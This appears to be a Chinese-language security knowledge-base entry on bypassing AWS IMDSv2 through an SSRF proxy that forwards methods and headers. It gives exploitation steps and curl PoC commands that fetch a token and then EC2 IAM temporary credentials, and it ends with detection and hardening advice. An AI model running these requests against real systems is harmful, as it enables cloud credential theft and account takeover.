---
id: cloud-metadata-ssrf-imdsv2-token-credential
title: SSRF 代理可自定义方法与请求头时绕过 IMDSv2 读取 EC2 IAM 临时凭证
type: scenario
domain: cloud
path: cloud/metadata
technique: ssrf-imdsv2-token-credential
aliases:
- IMDSv2 SSRF 绕过
- PUT /latest/api/token
- X-aws-ec2-metadata-token
- EC2 元数据临时凭证
- 169.254.169.254 IMDSv2
tags:
- cloud
- aws
- ec2
- imdsv2
- ssrf
- metadata
- credential
- spring-actuator
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:17:55+08:00'
  notes: 已对照原文核对：图04 证实经 /proxy?url= 转发 PUT 取 IMDSv2 token 并带 X-aws-ec2-metadata-token 读 IAM 临时凭证，方法与头转发描述一致；触发条件与边界准确。原文未给组件版本区间。PoC 未在本机执行。
---

## 一句话结论

IMDSv2 靠“先 PUT 取 token、后续请求带自定义头”阻止普通 GET SSRF；若目标代理接口会把用户指定的 HTTP 方法和请求头原样转发，就可以先经 SSRF 取 token，再带 `X-aws-ec2-metadata-token` 读取 IAM 角色临时凭证，接管对应 AWS 权限。

## 原理

- EC2 元数据服务在 `169.254.169.254`。IMDSv2 要求两步：
  1. `PUT /latest/api/token`，带请求头 `X-aws-ec2-metadata-token-ttl-seconds: <秒>`，返回 session token；
  2. 后续所有元数据 GET 都带 `X-aws-ec2-metadata-token: <token>`，否则返回 401。
- 多数 SSRF 只能发 GET 或不能自定义头，因此 IMDSv2 能挡住简单的 `?url=http://169.254.169.254/...` 读取。
- 但“代理/URL 抓取”类接口如果直接复用用户请求的方法与 header（例如 Spring Boot Actuator 暴露的 proxy 端点），就等价于给攻击者一个可发任意 HTTP 请求的内网客户端。
- 拿到 token 后可读：
  - `/latest/meta-data/iam/security-credentials/` → 角色名；
  - `/latest/meta-data/iam/security-credentials/<role>` → `AccessKeyId`、`SecretAccessKey`、`Token`、`Expiration`；
  - `/latest/meta-data/identity-credentials/`、`user-data` 等也可能泄露信息。
- 临时凭证可直接配置为 AWS CLI 身份，调用 STS/S3/DynamoDB 等 API，后续权限取决于角色策略。

## 触发条件

- 存在 SSRF/代理入口，且能控制 HTTP 方法（至少 PUT）和请求头；
- 服务端可访问 `169.254.169.254`（在 EC2 内或可路由到链路本地地址）；
- 实例启用了 IMDSv2，但仍允许上述两步交互（未把 hop limit 设为 1 或未阻断代理出口）；
- 实例绑定了 IAM 角色（否则无凭证可读）。

## 利用步骤

1. 先直接 GET 元数据路径，确认返回 401（IMDSv2 生效）或正常内容（IMDSv1）。
2. 通过代理发 `PUT /latest/api/token`，带 `X-aws-ec2-metadata-token-ttl-seconds`，取回 token。
3. 带 `X-aws-ec2-metadata-token` 请求 `iam/security-credentials/`，枚举角色名。
4. 请求 `iam/security-credentials/<role>`，取得临时凭证三元组。
5. 写入 `~/.aws/credentials` 或环境变量，用 `aws sts get-caller-identity` 确认身份，再按角色权限枚举资源。

## PoC

```bash
# 1) 取 IMDSv2 token
curl -u user:pass -X PUT \
  "https://target/proxy?url=http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# 2) 枚举 IAM 角色
curl -u user:pass \
  "https://target/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: <token>"

# 3) 读取临时凭证
curl -u user:pass \
  "https://target/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>" \
  -H "X-aws-ec2-metadata-token: <token>"
```

返回示例：

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "IQoJb3JpZ2luX2Vj...",
  "Expiration": "2025-09-26T18:01:45Z"
}
```

配置后：

```bash
aws sts get-caller-identity
```

## 变体与关联

- 变体：若代理只允许 GET，可先尝试 IMDSv1（部分实例同时启用）；或寻找能注入 CRLF/自定义头的 SSRF。
- 变体：AWS ECS/EKS 任务角色、GCP/Azure 元数据也有对应的凭证端点，方法类似；Azure 需 `Metadata: true` 头，同样依赖头部转发。
- 变体：拿到凭证后结合 `cloud-cloud-iam-workload-role-policy-selfcheck` 的思路枚举权限。
- 关联：[[web-generic-ssrf-cloud-metadata]]（云元数据 SSRF 通用手法）；[[cloud-s3-presigned-url-vpce-bypass]]（用同一份凭证绕过 S3 网络策略）。
- 边界：实例禁用 IMDS、仅允许 IMDSv1 之外的严格 hop limit、代理剥离自定义头/方法、或没有 IAM 角色时，本手法不成立。

## 检测与防御

- 检测：出站请求出现 `169.254.169.254/latest/api/token` 或 `X-aws-ec2-metadata-token` 头；代理接口被用来发 PUT 到链路本地地址。
- 检测：应用日志中出现异常的代理 URL 参数、元数据路径或 401 后紧接着 PUT。
- 防御：启用 IMDSv2 并把 `HttpPutResponseHopLimit` 设为 1（容器/代理无法直接访问）；禁用不必要的 URL 代理/Actuator 端点。
- 加固：角色最小权限；出站阻断链路本地地址；代理接口只允许白名单目标与固定 GET；监控凭证使用异常。
